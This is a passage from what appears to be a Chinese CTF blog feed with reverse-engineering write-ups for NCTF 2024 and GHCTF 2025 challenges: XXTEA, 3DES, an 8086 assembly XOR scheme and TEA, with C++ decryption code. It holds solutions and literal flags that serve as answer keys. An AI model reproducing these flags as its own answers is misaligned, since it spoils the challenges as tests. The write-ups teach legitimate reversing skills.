key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-22.png" alt="alt text"></p><h3 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p<span class="number">-1</span>)%<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc1[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xB1</span>,</span><br><span class="line">      <span class="number">0x3E</span>, <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xC8</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x48</span>, <span class="number">0x69</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xDE</span>, <span class="number">0x81</span>, <span class="number">0xD8</span>, <span class="number">0xAD</span>, <span class="number">0xC2</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0xCB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0xF1</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x16</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea_decrypt1</span>((<span class="type">uint32_t</span>*)enc1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">xxtea_decrypt2</span>((<span class="type">uint32_t</span>*)enc2, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.20s%.20s\n&quot;</span>, enc1,enc2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;H4rd_VM_with_Gor0ut1n3_5fc4b0be7ad&#125;</code></p><h2 id="XLogin"><a href="#XLogin" class="headerlink" title="XLogin"></a>XLogin</h2><p>jadx加载发现代码中调用了Decstr函数来解密一些字符串，可以在libsimple.so里面找到DecStr函数实现。</p><p>具体解密字符串函数就是Base64换表解密后再异或上当前字符串长度值。</p><p><img src="/2025/03/24/NCTF2024/image-24.png" alt="alt text"></p><p>就可以解密得到这些实际字符串。</p><p><img src="/2025/03/24/NCTF2024/image-25.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-26.png" alt="alt text"></p><p>发现doCheck是在native里面，ida分析libnative.so，发现有个loadDex，应该是动态加载一个dex。</p><p><img src="/2025/03/24/NCTF2024/image-27.png" alt="alt text"></p><p>在loadDex下面就是doCheck函数实际实现。</p><p><img src="/2025/03/24/NCTF2024/image-28.png" alt="alt text"></p><p>通过特征可以发现是使用了3des加密，先猜测他没有魔改，毕竟那一坨代码没人想看。上面的ptr的两个数据（xmmword_1804和unk_1814共24字节数据）就是被加密的flag，3des加密后下面的while循环就是对加密后的数据与flag密文进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-29.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-30.png" alt="alt text"></p><p>在apk的Assets里面会发现又有个libsimple.so，ida分析没有东西，直接拖入010发现存在一个dex结构头，前面的这64字节应该是没用的。</p><p><img src="/2025/03/24/NCTF2024/image-31.png" alt="alt text"></p><p>libnative.so里面loadDex跟到的函数验证了这个猜想，v13是Assets里的libsimple.so文件大小，减去了64，然后下面v17是读取起始指针，也加上了64，说明读取实际文件跳过了前64字节。</p><p><img src="/2025/03/24/NCTF2024/image-32.png" alt="alt text"></p><p>把前64字节去除，使用jadx分析。发现是Check函数，检测了username和password，和题目描述flag格式对应。username这边可以直接解密出来是<code>X1c@dM1n1$t</code>，然后使用username的MD5值作为密钥去调用doCheck加密。</p><p><img src="/2025/03/24/NCTF2024/image-33.png" alt="alt text"></p><p>密钥：<code>7d53ecd36a43d3d237e7dd633dcf8497</code></p><p>然后提取密文进行3des解密即可，然后这边有个端序问题卡了不少师傅一段时间，密文以及密钥都要以8字节位一组转换到大端序，才能解密，然后解密完的明文也要从大端序转回到小端序。</p><p><img src="/2025/03/24/NCTF2024/image-34.png" alt="alt text"></p><p>解密完将明文以8字节一组倒序得到明文<code>SafePWD~5y$x?YM+5U05Gm6=</code></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6=&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF-2024-Reverse-WP&quot;&gt;&lt;a href=&quot;#NCTF-2024-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;NCTF 2024 Reverse WP&quot;&gt;&lt;/a&gt;NCTF 2024 Reverse WP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GHCTF2025WP</title>
    <link href="https://tkazer.github.io/2025/03/06/GHCTF2025WP/"/>
    <id>https://tkazer.github.io/2025/03/06/GHCTF2025WP/</id>
    <published>2025-03-06T02:37:20.000Z</published>
    <updated>2025-03-24T11:15:54.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GHCTF-2025-Reverse-WP"><a href="#GHCTF-2025-Reverse-WP" class="headerlink" title="GHCTF 2025 Reverse WP"></a>GHCTF 2025 Reverse WP</h1><p>这次也是第一次给CTF比赛出题，经验不足，完全是凭借之前打比赛做的题的经验来出的，难度尽可能把控住梯度上升，但是可能还是没做的那么好，各位师傅见谅了，如果有什么建议也可以联系我。</p><h2 id="ASN-Signin"><a href="#ASN-Signin" class="headerlink" title="ASN?Signin!"></a>ASN?Signin!</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这题估计大伙都AI一把梭了（），不过还是讲讲asm代码分析流程。</p><p>asm代码开头是数据段，存放着DATA1和DATA2，这两段就是关键数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">    WELCOME_MSG db &#x27;Welcome to GHCTF!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    INPUT_MSG db &#x27;Input your flag:&#x27;, &#x27;$&#x27;</span><br><span class="line"></span><br><span class="line">    WRONG_MSG db 0DH, 0AH, &#x27;Wrong!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    RIGHT_MSG db 0DH, 0AH, &#x27;Right!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    </span><br><span class="line">    DATA1 DB 26H,27H,24H,25H,2AH,2BH,28H,00H</span><br><span class="line">            DB 2EH,2FH,2CH,2DH,32H,33H,30H,00H</span><br><span class="line">            DB 36H,37H,34H,35H,3AH,3BH,38H,39H</span><br><span class="line">            DB 3EH,3FH,3CH,3DH,3FH,27H,34H,11H</span><br><span class="line">    </span><br><span class="line">    DATA2 DB 69H,77H,77H,66H,73H,72H,4FH,46H</span><br><span class="line">            DB 03H,47H,6FH,79H,07H,41H,13H,47H</span><br><span class="line">            DB 5EH,67H,5FH,09H,0FH,58H,63H,7DH</span><br><span class="line">            DB 5FH,77H,68H,35H,62H,0DH,0DH,50H</span><br><span class="line">    </span><br><span class="line">    BUFFER1 db 33 dup(0)</span><br><span class="line">    BUFFER2 db 33 dup(0)</span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure><p>下面这部分就是程序启动时执行代码，读入33字节到BUFFER1中，然后CALL DO1函数，再CALL ENC函数，最后LOOP1进行比对跳转到结果输出。所以可知DATA2就是加密后的Flag数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">START:</span><br><span class="line">    MOV AX,@DATA</span><br><span class="line">    MOV DS,AX</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    MOV DX,OFFSET WELCOME_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV DX,OFFSET INPUT_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV AH,0AH</span><br><span class="line">    MOV DX,OFFSET BUFFER1</span><br><span class="line">    MOV BYTE PTR[BUFFER1],33    ; 读入33字节到BUFFER1</span><br><span class="line">    INT 21H</span><br><span class="line">    CALL DO1                    ; Call DO1</span><br><span class="line">    CALL ENC                    ; Call ENC</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA2</span><br><span class="line">    MOV CX,32</span><br><span class="line">LOOP1:                          ; 比对DATA2和加密后的数据</span><br><span class="line">    MOV AL,[SI]</span><br><span class="line">    CMP AL,[DI]</span><br><span class="line">    JNE P2</span><br><span class="line">    INC SI</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP1</span><br><span class="line">P1:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,RIGHT_MSG            ; 输出正确信息</span><br><span class="line">    INT 21H</span><br><span class="line">    JMP EXIT_PROGRAM</span><br><span class="line">P2:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,WRONG_MSG            ; 输出错误信息</span><br><span class="line">    INT 21H</span><br></pre></td></tr></table></figure><p>以下是DO1函数和DO2函数代码，可以看到是针对DATA1进行的一些操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DO1 PROC</span><br><span class="line">    PUSH SI</span><br><span class="line">    PUSH DI</span><br><span class="line">    PUSH CX</span><br><span class="line">    XOR SI,SI</span><br><span class="line">    MOV CX,8</span><br><span class="line">SWAP_LOOP:</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV DI,SI</span><br><span class="line">    ADD DI,4</span><br><span class="line">    CMP DI,28</span><br><span class="line">    JL NOWRAP</span><br><span class="line">    SUB DI,28</span><br><span class="line">NOWRAP:</span><br><span class="line">    MOV BX,SI</span><br><span class="line">    CALL DO2</span><br><span class="line">    ADD SI,4</span><br><span class="line">    POP CX</span><br><span class="line">    LOOP SWAP_LOOP</span><br><span class="line">    POP CX</span><br><span class="line">    POP DI</span><br><span class="line">    POP SI</span><br><span class="line">    RET</span><br><span class="line">DO1 ENDP</span><br><span class="line"></span><br><span class="line">DO2 PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV CX,4</span><br><span class="line">LOOP3:</span><br><span class="line">    MOV AL,DATA1[BX]</span><br><span class="line">    MOV AH,DATA1[DI]</span><br><span class="line">    MOV DATA1[BX],AH</span><br><span class="line">    MOV DATA1[DI],AL</span><br><span class="line">    INC BX</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP3</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">DO2 ENDP</span><br></pre></td></tr></table></figure><p>下面这部分是ENC函数代码，是利用DO1后的DATA1数据与输入的字符进行XOR操作，注意到xor操作都是在WORD，也就是二字节的基础上进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ENC PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA1</span><br><span class="line">    MOV CX,8</span><br><span class="line">LOOP2:</span><br><span class="line">    MOV AX,WORD PTR[DI + 1]</span><br><span class="line">    XOR WORD PTR[SI],AX             ; *(SHORT*)(Input + i) ^= *(SHORT*)(DATA1 + i + 1)</span><br><span class="line">    MOV AX,WORD PTR[DI + 2]</span><br><span class="line">    XOR WORD PTR[SI + 2],AX         ; *(SHORT*)(Input + i + 2) ^= *(SHORT*)(DATA1 + i + 2)</span><br><span class="line">    ADD SI,4</span><br><span class="line">    ADD DI,4</span><br><span class="line">    LOOP LOOP2</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">ENC ENDP</span><br></pre></td></tr></table></figure><p>由于DO1和DO2只是对DATA1这个静态数据进行操作，所以可以直接动调拦截到执行完DO1的DATA1数据进行对DATA2的解密。这题ASM代码故意给全的，就是为了让选手可以直接编译到EXE并且使用DosBox动调，（大伙入门8086汇编应该都用过的工具）。</p><p>直接g命令执行到DO1函数，并且p命令步过，</p><p><img src="/2025/03/06/GHCTF2025WP/1.png" alt="alt text"></p><p>再t命令步入ENC函数，再u命令反汇编就可以看到DATA1的地址。</p><p><img src="/2025/03/06/GHCTF2025WP/2.png" alt="alt text"></p><p>直接d命令就可以看到DATA1的数据，提取出来与DATA2进行解密计算即可得到flag。</p><p><img src="/2025/03/06/GHCTF2025WP/3.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> DATA1[] = &#123;</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x3e</span>, <span class="number">0x27</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3e</span>,</span><br><span class="line">        <span class="number">0x3f</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> DATA2[] = &#123;</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x4F</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x79</span>, <span class="number">0x07</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0x13</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x63</span>, <span class="number">0x7D</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">1</span>);</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i + <span class="number">2</span>) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, DATA2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值"><a href="#Flag值" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_y0u&#39;re_g00d_@t_@5M!!&#125;</code></p><h2 id="LockedSecret"><a href="#LockedSecret" class="headerlink" title="LockedSecret"></a>LockedSecret</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这题本来是当作第一批第二难度的题，实际题解远低于FishingKit（），没想到展开Tea卡住了不少人了。</p><p>前面常规UPX变异脱壳就跳过讲解了，不会的新生可以去看文章再学习学习。<br>将脱完壳的程序拖入IDA分析，可以看到主函数内共有两个关键函数调用，byte_3F4060就是加密后的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/4.png" alt="alt text"></p><p>第一个函数的利用伪随机对一个全局数组进行初始化赋值。</p><p><img src="/2025/03/06/GHCTF2025WP/5.png" alt="alt text"></p><p>第二个函数就是加密函数，将一串明文key与上一个函数初始化的值进行异或计算得到用于加密的Key。底下加密部分代码由于IDA的反反编译器问题，导致有点丑陋，但是还是可以看出Tea加密的特征，只不过和常规Tea相比似乎少了循环。</p><p><img src="/2025/03/06/GHCTF2025WP/6.png" alt="alt 